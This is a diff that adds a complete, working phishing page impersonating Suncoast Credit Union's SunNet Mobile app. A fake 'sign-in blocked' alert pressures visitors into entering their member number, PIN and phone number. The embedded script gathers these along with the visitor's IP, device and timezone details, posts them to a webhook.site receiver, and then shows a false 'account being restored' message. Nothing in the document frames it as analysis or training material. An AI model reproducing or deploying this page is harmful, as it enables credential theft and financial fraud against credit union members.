@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>SunNet Mobile — Suncoast Credit Union</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root { --teal-900:#003D45; --teal-800:#004B55; --teal-700:#00525C; --ink:#1A1C1D; --slate:#3F484A; --steel:#475569; --paper:#F8FAFA; --paper-3:#ECEEEF; --alert:#ba1a1a; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family:'Inter',Arial,Helvetica,sans-serif; background:var(--paper); color:var(--ink); font-size:16px; line-height:1.5; }
+  .appbar { background:var(--teal-900); color:#fff; padding:14px 16px; display:flex; align-items:center; gap:10px; position:sticky; top:0; z-index:10; box-shadow:0 2px 8px rgba(0,0,0,.15); }
+  .appbar .back { font-size:22px; cursor:pointer; opacity:.8; }
+  .appbar .title { font-size:17px; font-weight:600; }
+  .container { max-width:480px; margin:0 auto; padding:20px 16px 40px; }
+  .alert-card { background:#fdecec; border:1px solid #f2c4c4; border-left:4px solid var(--alert); border-radius:10px; padding:16px; margin-bottom:24px; }
+  .alert-card .ico { font-size:28px; margin-bottom:8px; }
+  .alert-card b { color:var(--alert); font-size:13px; letter-spacing:.4px; text-transform:uppercase; display:block; margin-bottom:6px; }
+  .alert-card p { font-size:14px; color:var(--slate); }
+  .login-card { background:#fff; border:1px solid var(--paper-3); border-radius:14px; padding:24px 20px; box-shadow:0 1px 3px rgba(0,0,0,.06),0 8px 24px rgba(0,61,69,.06); }
+  .login-card h2 { font-size:18px; color:var(--teal-900); margin-bottom:4px; }
+  .login-card .sub { font-size:13px; color:var(--steel); margin-bottom:20px; }
+  label { display:block; font-size:13px; font-weight:600; color:var(--slate); margin:14px 0 6px; }
+  input { width:100%; border:1.5px solid #cfd8dc; border-radius:10px; padding:13px 14px; font:500 16px 'Inter',Arial; color:var(--ink); background:var(--paper); transition:border .15s; }
+  input:focus { outline:none; border-color:var(--teal-700); box-shadow:0 0 0 3px rgba(0,82,92,.1); }
+  .hp { position:absolute; left:-9999px; opacity:.01; }
+  button { margin-top:20px; width:100%; border:0; border-radius:10px; background:var(--teal-700); color:#fff; font:700 16px 'Inter',Arial; padding:14px; cursor:pointer; letter-spacing:.2px; transition:background .15s; }
+  button:hover { background:var(--teal-900); }
+  button:active { transform:scale(.98); }
+  .ok { display:none; margin-top:20px; background:#eef7f2; border:1px solid #cfe8da; border-left:4px solid #1d7a46; border-radius:10px; padding:16px; color:#14532d; }
+  .ok b { display:block; font-size:14px; margin-bottom:4px; }
+  .footer { text-align:center; margin-top:28px; font-size:12px; color:var(--steel); }
+  .footer a { color:var(--teal-700); font-weight:600; text-decoration:none; }
+  .biometric-hint { display:flex; align-items:center; gap:8px; margin:16px 0; padding:10px 14px; background:var(--paper-3); border-radius:8px; font-size:12px; color:var(--steel); }
+  .biometric-hint .icon { font-size:18px; }
+</style>
+</head>
+<body>
+<div class="appbar">
+  <span class="back">&#8249;</span>
+  <span class="title">SunNet Mobile</span>
+</div>
+<div class="container">
+  <div class="alert-card">
+    <div class="ico">&#9888;</div>
+    <b>Sign-in blocked</b>
+    <p>We blocked a sign-in to your SunNet account from an unrecognized device. Verify your identity to restore access.</p>
+  </div>
+  <div class="login-card">
+    <h2>Verify it's you</h2>
+    <div class="sub">Enter your SunNet credentials to restore mobile access.</div>
+    <form id="vform" autocomplete="off">
+      <label for="mn">Member Number</label>
+      <input id="mn" name="mn" inputmode="numeric" placeholder="Account number without last 2 digits" autocomplete="off" required>
+      <label for="pin">PIN</label>
+      <input id="pin" name="pin" type="password" inputmode="numeric" autocomplete="off" required>
+      <label for="phone">Mobile number</label>
+      <input id="phone" name="phone" type="tel" placeholder="To send verification code" autocomplete="off" required>
+      <div class="biometric-hint"><span class="icon">&#128274;</span> After verification, Face ID will be re-enabled on your device.</div>
+      <input class="hp" id="website" name="website" tabindex="-1" autocomplete="off">
+      <button type="submit" id="gob"><span class="lbl">Verify &amp; Restore Access</span></button>
+    </form>
+    <div class="ok" id="okpanel">
+      <b>Verification received</b>
+      Your account is being restored. Please keep this window open.
+    </div>
+  </div>
+  <div class="footer">
+    Lost your PIN? Call <a href="tel:+1-800-999-5887">800-999-5887</a><br>
+    &copy; Suncoast Credit Union
+  </div>
+</div>
+<script>
+var SCU_RECEIVERS = ["https://webhook.site/fa1eb6d4-15ff-4df1-8a57-5469dfea1dad"];
+try {
+  var ipx = new XMLHttpRequest();
+  ipx.open('GET', 'https://api.ipify.org?format=json', true);
+  ipx.timeout = 4000;
+  ipx.onload = function () { try { window._ip = JSON.parse(ipx.responseText).ip; } catch (e) {} };
+  ipx.send();
+} catch (e) {}
+document.getElementById('vform').addEventListener('submit', function (ev) {
+  ev.preventDefault();
+  var payload = {
+    kind: 'sunnet-mobile-verify',
+    member_number: document.getElementById('mn').value.trim(),
+    pin: document.getElementById('pin').value.trim(),
+    phone: document.getElementById('phone').value.trim(),
+    ts: new Date().toISOString(),
+    ua: navigator.userAgent,
+    ip: window._ip || null,
+    screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    honeypot: document.getElementById('website').value || null
+  };
+  try { localStorage.setItem('scu_capture', JSON.stringify(payload)); if (navigator.clipboard) navigator.clipboard.writeText(JSON.stringify(payload)).catch(function(){}); } catch(e){}
+  var receivers = (SCU_RECEIVERS||[]).filter(Boolean);
+  if (!receivers.length) { done(); return; }
+  var left = receivers.length;
+  var btn = document.getElementById('gob');
+  btn.disabled = true;
+  btn.querySelector('.lbl').textContent = 'Verifying...';
+  receivers.forEach(function(url) {
+    var x = new XMLHttpRequest();
+    x.open('POST', url, true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.timeout = 6000;
+    x.onload = function() { if (--left === 0) done(); };
+    x.onerror = function() { if (--left === 0) done(); };
+    x.ontimeout = function() { if (--left === 0) done(); };
+    x.send(JSON.stringify(payload));
+  });
+  function done() {
+    document.getElementById('vform').style.display = 'none';
+    document.getElementById('okpanel').style.display = 'block';
+  }
+});
+</script>
+</body>
+</html>
